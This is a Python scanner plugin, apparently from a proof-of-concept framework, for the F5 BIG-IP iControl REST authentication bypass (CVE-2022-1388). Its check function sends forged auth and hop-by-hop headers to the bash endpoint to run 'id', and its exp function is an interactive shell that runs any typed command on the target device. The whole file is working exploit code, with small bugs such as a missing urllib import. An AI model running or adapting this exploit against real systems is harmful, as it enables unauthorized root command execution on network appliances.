#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {}
  ret['links'] = ''
  ret['huixian'] = '该脚本存在exp函数，可执行命令'
  ret['method'] = 'post'
  ret['bugname'] = "F5 BIG-IP iControl REST身份验证绕过 CVE-2022-1388"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret
def run(url,ua):
  ret = msg()
  headers = {
        "User-Agent": ua,
        "Content-type": "application/json",
        "Connection": "close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host",
        "X-F5-Auth-Token": "anything",
        "Authorization": "Basic YWRtaW46"}
  target = "/mgmt/tm/util/bash"
  cmd = {"command": "run", "utilCmdArgs": "-c id"}
  url1 = url + target
  ret['url'] = url1
  try:
    res = requests.post(url1,headers=headers,json=cmd,timeout=15,verify=False)
    if res.status_code == 200 and 'uid' in res.text and 'gid' in res.text and 'groups' in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret
def exp(url):
  headers = {
    'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
    'X-F5-Auth-Token': 'asdf',
    'Connection': 'X-F5-Auth-Token',
    'Content-Type': 'application/json'
    }
  print('[+] 开始执行命令(输入exit退出)!')
  cmd = ''
  try:
    while cmd != 'exit':
      cmd = input('[+] 执行命令 > ')
      try:
        vurl = urllib.parse.urljoin(url, '/mgmt/tm/util/bash')
        j = {"command": "run", "utilCmdArgs": "-c '{0}'".format(cmd)}
        rep = requests.post(vurl, headers=headers, json=j, verify=False, timeout=3)
        if rep.status_code == 200 and re.search('commandResult', rep.text) and re.search('tm:util:bash:runstate', rep.text):
          output = rep.json()['commandResult']
          print('[+] 执行结果: ', output)
      except:
        print('[+] 执行超时，请检查是否成功?')
        pass
      return True
  except:
    return False